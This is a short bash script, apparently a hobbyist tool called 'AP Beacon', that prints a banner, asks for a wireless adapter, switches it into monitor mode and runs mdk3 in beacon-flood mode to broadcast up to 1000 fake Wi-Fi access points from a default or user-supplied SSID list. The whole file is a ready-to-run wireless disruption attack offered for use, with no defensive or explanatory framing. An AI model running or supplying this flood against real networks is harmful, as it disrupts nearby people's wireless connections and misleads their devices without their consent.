echo -e "\e[1;32m     #    ######            ######                                     "
echo -e "\e[1;32m    # #   #     #  ####     #     # ######   ##    ####   ####  #    # "
echo -e "\e[1;32m   #   #  #     # #         #     # #       #  #  #    # #    # ##   # "
echo -e "\e[1;32m  #     # ######   ####     ######  #####  #    # #      #    # # #  # "
echo -e "\e[1;32m  ####### #            #    #     # #      ###### #      #    # #  # # "
echo -e "\e[1;32m  #     # #       #    #    #     # #      #    # #    # #    # #   ## "
echo -e "\e[1;32m  #     # #        ####     ######  ###### #    #  ####   ####  #    # "
echo " "
echo -e "\e[1;37m                                                     By BlueArduino20  "
echo " "
ifconfig
echo -n -e "\e[1;34mType your wireless adapter name > "
read AD
clear
echo -n -e "\e[1;34mDo you want to use the default dictionary (1000 APs)? y/n > "
read DD
clear
if [ $DD == n ]; then
	echo -n -e "\e[1;34mType the name of your own dictionary > "
	read OWN
	clear
	echo -e "\e[1;34mOk. If you want to stop the process, press CTRL+Z"
	sleep 1
	ifconfig $AD down
	iwconfig $AD mode monitor
	ifconfig $AD up
	mdk3 $AD b -f ./$OWN -a -s 1000
	exit
else
	clear
	echo -e "\e[1;34mOk. If you want to stop the process, press CTRL+Z"
	sleep 1
	ifconfig $AD down
	iwconfig $AD mode monitor
	ifconfig $AD up
	mdk3 $AD b -f ./SSID_List.txt -a -s 1000
fi
